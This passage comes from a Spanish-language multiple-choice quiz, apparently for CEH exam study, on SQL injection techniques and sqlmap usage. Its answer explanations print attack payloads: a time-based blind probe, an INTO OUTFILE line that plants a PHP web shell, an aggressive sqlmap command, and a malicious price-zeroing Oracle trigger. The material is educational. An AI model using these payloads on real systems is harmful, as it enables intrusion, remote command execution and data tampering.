La query usa **time-based blind SQL injection**: `IF(LEN(USER)=7) WAITFOR DELAY '00:00:10'` — si el delay de 10 segundos se produce, la condición es TRUE, confirmando que el **nombre del usuario de BBDD tiene exactamente 7 caracteres**. Este es el primer paso para extraer el username completo carácter a carácter.

---

**P9.** Un pentester quiere crear una web shell PHP en un servidor MySQL comprometido mediante SQL injection. ¿Qué función MySQL debe usar en su payload?

A) `LOAD_FILE('/var/www/html/shell.php')`  
B) `xp_cmdshell 'echo <?php system($_GET["cmd"]); ?>'`  
C) `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`  
D) `EXEC('CREATE FILE /var/www/html/shell.php')`  

**Respuesta correcta: C**
`SELECT ... INTO OUTFILE '/ruta'` escribe el resultado de la query en un fichero del servidor. En este caso crea una **web shell PHP** en el directorio web. `LOAD_FILE()` lee ficheros (no escribe). `xp_cmdshell` es de MSSQL. La opción D no existe en MySQL.

---

**P10.** Durante un pentest, el analista ejecuta `sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --random-agent --level=5 --risk=3`. ¿Qué hacen los flags `--level=5` y `--risk=3` específicamente?

A) --level=5 aumenta el número de threads; --risk=3 habilita HTTPS  
B) --level=5 hace el scan más exhaustivo; --risk=3 hace los tests más agresivos  
C) --level=5 son los niveles de privilegio; --risk=3 son las técnicas de bypass  
D) --level=5 es el número de BBDD a escanear; --risk=3 define el timeout  

**Respuesta correcta: B**
En sqlmap: `--level` (rango 1-5) controla el nivel de exhaustividad de los tests — mayor nivel = más tests. `--risk` (rango 1-3) controla la agresividad — mayor riesgo = tests más agresivos que podrían modificar datos. Level y risk son independientes y complementarios.

---

**P11.** Un pentester de red red detecta que una aplicación es vulnerable a HTTP Header SQL Injection. ¿En cuáles de los siguientes campos HTTP puede inyectar la payload?

A) Content-Type y Authorization  
B) X-Forwarded-For, User-Agent, Referer y Cookie  
C) Accept-Encoding y Transfer-Encoding  
D) WWW-Authenticate y Proxy-Authorization  

**Respuesta correcta: B**
Los cuatro campos HTTP header vulnerables a SQL injection mencionados en el CEH son: **X-Forwarded-For**, **User-Agent**, **Referer** y **Cookie**. Estos campos se suelen registrar en la BBDD o se usan en queries sin sanitizar. Los headers de la opción A y D son de autenticación/contenido y raramente se pasan a queries SQL.

---

**P12.** Una organización descubre que su servidor web fue comprometido mediante SQL injection para crear un trigger malicioso en Oracle. El trigger ejecuta `UPDATE ITEMS SET Price=0` en cada INSERT/UPDATE. ¿Cómo se denomina esta técnica?

A) Second-order SQL injection  
B) DNS exfiltration vía SQL injection  
C) Database backdoor vía trigger  
D) Piggybacked SQL injection  

**Respuesta correcta: C**
Esta es una técnica de **Database Backdoor** creada mediante un trigger Oracle. El trigger `SET_PRICE` se activa automáticamente en cada INSERT o UPDATE sobre la tabla ITEMS y pone el precio a 0 — una backdoor económica que persiste en la BBDD sin requerir interacción continua del atacante.
